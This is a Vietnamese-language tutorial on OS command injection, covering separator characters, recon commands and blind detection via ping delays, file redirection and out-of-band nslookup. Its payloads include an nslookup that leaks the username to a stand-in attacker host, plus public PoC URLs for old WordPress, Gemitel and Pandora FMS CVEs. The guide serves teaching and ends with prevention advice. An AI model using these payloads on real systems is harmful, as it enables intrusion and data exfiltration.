## OS Command Injection là gì?
OS Command Injection (hay còn được gọi là shell injection) là một lỗ hổng bảo mật web cho phép kẻ tấn công thực thi các lệnh hệ điều hành (OS) tùy ý trên máy chủ đang chạy service nào đó. Kẻ tấn công có thể tận dụng lỗ hổng này để khai thác, lấy thông tin, chuyển cuộc tấn công sang hệ thống khác bên trong tổ chức
![](https://portswigger.net/web-security/images/os-command-injection.svg)
## Thực hiện các lệnh tùy ý
Ví dụ: https://insecure-website.com/stockStatus?productID=381&storeID=29

Ở đây để lấy thông tin thì web sẽ gọi productID và store. Nhưng vì một vài lý do nào đó, chức năng được triển khai bằng cách gọi lệnh shell với productID và store làm đối số:
```
stockreport.pl 381 29
```
Nếu hệ thống không được bảo vệ chống lại OS Command Injection thì Attacker có thể gửi đầu vào sau để thực thi lệnh tùy ý
```
& command &
```
Ví dụ: https://insecure-website.com/stockStatus?productID=381&id&&storeID=29

## Các lệnh thường được sử dụng

| Purpose of command | Linux | Windows |
| -------- | -------- | -------- |
| Tên người dùng hiện tại | whoami     | whoami     |
| OS | OSuname -a | ver |
| Cấu hình mạng | ifconfig | ipconfig |
| Kết nối mạng | netstat -an | netstat -an |
| Tiến trình đang chạy | ps -ef | tasklist |

![](https://images.viblo.asia/d0cffc39-fe23-4edb-8f0f-ff8c9c3580c9.png)

## Lỗ hổng blind OS command injection
Nhiều trường hợp OS command injection là blind vulnerabilities. Có nghĩa là đầu ra sẽ không trả về trong HTTP response. Vậy kết quả sẽ k hiển thị trên màn hình. Vậy có cách nào xác định được blind vulnerabilities.

Có thể sử dụng time delays để xác định được blind vulnerabilities. Nó sẽ kích hoạt độ trễ, cho phép bạn xác nhận rằng lệnh này đã được thực thi hay chưa dựa vào thời gian mà ứng dụng cần để đáp ứng. Lệnh ping là lệnh hiệu quả để thực hiện việc này, vì nó cho phép chỉ định gói ICMP cần gửi và thời gian để lệnh chạy: 
```bash
& ping -c 10 127.0.0.1 &
```
Có thể khai thác lỗ hổng này bằng cách chuyển hướng đầu ra từ lệnh chèn vào 1 tệp trong thư mục gốc mà bạn có thể đọc nó bằng trình duyệt của mình.

Ví dụ: Nếu thư mục gốc của website ở `/var/www/static` thì bạn có thể gửi lệnh tiêm như sau
```bash
&whoami > /var/www/static/whoami.txt &
```
Rồi sau đó bạn có thể sử dụng trình duyệt của mình truy cập vào http://target.com/whoami.txt để truy xuất tệp và xem đầu ra từ lệnh được chèn vào.

Ngoài ra, còn có thể sử dụng 1 số thủ thuật khác để kiểm tra xem lệnh tiêm đã ăn hay chưa.
Ví dụ:
```bash
& nslookup web-attacker.com &
```
Attacker sẽ kiểm tra server của mình và phát hiện ra rằng lệnh đã được tiêm thành công hay chưa.
Ngoài ra còn có thể sử dụng 
```bash
& nslookup `whoami`.web-attacker.com &
```

## Các cách dùng để Command Injection
Đầu tiên cần phải xác định được hệ thống target đang hoạt động là gì, Windows hay Linux?
Một số ký tự có chức năng phân tách lệnh, cho phép các lệnh nối với nhau
- &
- &&
- |
- ||
## Ví dụ
### Một số lỗi Command Injection thực tế đã gặp phải

#### WordPress DZS-VideoGallery Plugin (CVE: 2014-9094)
Phiên bản DZS-VideoGallery 7.85 Plugin của WordPress có lỗ hổng có thể truyền command injection vào đây, 

**PoC:**
```
http://www.example.com/wp-content/plugins/dzs-videogallery/img.php?webshot=1&amp;src=http://www.example.com/1.jpg$(os-cmd)
```
#### Gemitel 3.50 - '/affich.php' Remote File Inclusion / Command Injection (CVE: 2004-1934)
File : html/affich.php

Code:
************************************************************************
```php
$f_inc=$base."sp-turn.php";
$plus = "../"; // rajoute au chemin pour trouver les fichiers .txt
require("$f_inc");
//require("sp-turn.php");
```
************************************************************************
Đọc source code ta cũng thấy được rằng đoạn `require("$f_inc");` sẽ thực thi command line. Mà `$f_inc=$base."sp-turn.php";`. Ở đoạn này ta có thể truyền `sp-turn.php` bằng `$base` tùy theo ý mình muốn

**PoC:**

```
http://www.example.com/[Gemitel folder]/html/affich.php?base=http://[your server]/
```
#### Pandora Fms 3.1 - OS Command Injection (CVE: 2010-4278)
1 đoạn code ngắn của file `operation/agentes/networkmap.php`
```php
32 $layout = (string) get_parameter ('layout', 'radial');
...
137 $filename_map = $config["attachment_store"]."/networkmap_".$layout;
138 $filename_img = "attachment/networkmap_".$layout."_".$font_size;
139 $filename_dot = $config["attachment_store"]."/networkmap_".$layout;
...
162                 $cmd = "$filter -Tcmapx -o".$filename_map." -Tpng
- -o".$filename_img." ".$filename_dot;
163                 $result = system ($cmd);
```
Ta có thể thấy có thể command injection vào đây

**PoC:**
```
http://servername/pandora_console/index.php?login=1&login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;uname%20-a;
```
```
http://servername/pandora_console/index.php?login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;id;
```
## Làm sao để ngăn ngừa Command Injection
Cách hiệu quả nhất để ngăn ngừa command injection là không dùng command nữa. Tức là không bao giờ gọi ra các lệnh OS từ lớp ứng dụng. Trong các trường hợp, có nhiều cách khác nhau để thực hiện chức năng cần thiết bằng cách sử dụng API trên nền tảng an toàn hơn.
Nếu không thể tránh khỏi việc sử dụng các lệnh OS thì phải thực hiện xác thực đầu vào mạnh
- Chỉ chấp nhận đối với các giá trị được phép
- Chỉ chấp nhận đầu vào là một số
- Chỉ chấp nhận đầu vào chỉ có ký tự chữ và số, không có ký tự đặc biệt, khoảng trắng,...
## Tài liệu tham khảo 
- https://support.portswigger.net/customer/portal/articles/2590661-using-burp-to-test-for-os-command-injection-vulnerabilities
- https://portswigger.net/web-security/os-command-injection
- https://www.owasp.org/index.php/Command_Injection